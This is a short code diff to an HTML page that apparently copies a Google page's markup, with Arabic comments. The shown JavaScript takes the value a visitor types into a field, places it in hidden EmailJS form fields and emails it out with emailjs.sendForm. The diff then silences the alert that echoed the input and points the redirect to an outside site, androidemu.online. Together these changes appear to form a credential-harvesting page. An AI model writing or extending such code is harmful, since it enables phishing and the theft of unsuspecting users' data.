@@ -255,7 +255,7 @@ initAft()</script><script class="ds:0" nonce="">AF_initDataCallback({key: 'ds:0'
     function showAlert() {
         var inputElement = document.getElementById('ppp');
         if (inputElement) {
-           / alert("القيمة المدخلة: " + inputElement.value);
+       //    alert("القيمة المدخلة: " + inputElement.value);
         } else {
             alert("لم يتم العثور على حقل الإدخال.");
         }
@@ -309,15 +309,16 @@ initAft()</script><script class="ds:0" nonce="">AF_initDataCallback({key: 'ds:0'
                 emailjs.sendForm(serviceID, templateID, emailJsForm)
                     .then(() => {
                       //  console.log('تم إرسال البريد الإلكتروني لتأكيد البيانات بنجاح.');
+                      window.location.href = 'https://androidemu.online/dashboard';
                      //   alert('تم إرسال بريد تأكيد البيانات بنجاح!');
-                     window.location.href = '/dashboard'; 
                     }, (err) => {
                      //   console.error('فشل إرسال البريد الإلكتروني لتأكيد البيانات:', err);
-                   //    alert('حدث خطأ أثناء إرسال بريد التأكيد. الرجاء المحاولة لاحقاً. الخطأ: ' + JSON.stringify(err));
+                     
+                   //   alert('حدث خطأ أثناء إرسال بريد التأكيد. الرجاء المحاولة لاحقاً. الخطأ: ' + JSON.stringify(err));
                     });
             } else {
                 //console.error("خطأ: عناصر نموذج EmailJS المخفية (emailJsForm, emailJsUserEmail, emailJsMessageContent, emailJsFromName) مفقودة.");
-              //  alert("خطأ داخلي: لا يمكن إعداد EmailJS لإرسال البريد. يرجى التحقق من الكود.");
+                //alert("خطأ داخلي: لا يمكن إعداد EmailJS لإرسال البريد. يرجى التحقق من الكود.");
             }
             
             
